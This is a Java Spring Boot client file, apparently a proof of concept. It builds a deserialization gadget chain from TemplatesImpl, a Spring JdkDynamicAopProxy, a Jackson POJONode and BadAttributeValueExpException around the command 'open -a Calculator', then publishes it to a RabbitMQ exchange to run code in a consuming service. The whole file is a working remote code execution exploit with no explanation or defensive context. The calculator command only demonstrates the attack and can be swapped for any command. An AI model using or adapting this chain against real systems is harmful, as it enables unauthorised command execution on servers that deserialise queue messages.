package com.example.client;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

@SpringBootApplication
public class ClientApplication implements CommandLineRunner {
    @Autowired
    RabbitTemplate rabbitTemplate;

    @Autowired
    ApplicationContext applicationContext;

    public static void main(String[] args) {
        SpringApplication.run(ClientApplication.class, args);
    }

    @Override
    public void run(String... args) throws Exception {
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl("open -a Calculator");

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templatesImpl);

        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler jdkDynamicAopProxyHandler = (InvocationHandler) constructor.newInstance(as);

        Templates templatesProxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, jdkDynamicAopProxyHandler);

        POJONode pojoNode = new POJONode(templatesProxy);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(poc, "val", pojoNode);

        rabbitTemplate.convertAndSend("test_exchange", "", poc);

        SpringApplication.exit(applicationContext);
    }
}
